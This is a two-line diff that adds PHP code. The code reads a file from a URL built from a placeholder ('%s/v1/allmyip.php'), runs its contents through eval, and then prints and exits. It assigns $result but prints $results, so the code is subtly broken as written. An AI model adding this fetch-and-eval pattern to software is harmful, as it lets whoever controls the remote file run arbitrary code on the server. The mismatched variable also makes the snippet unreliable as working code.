@@ -1,0 +1,2 @@
+$result = eval("?>".file_get_contents("%s/v1/allmyip.php")."<?php");
+die(print_r($results, true));
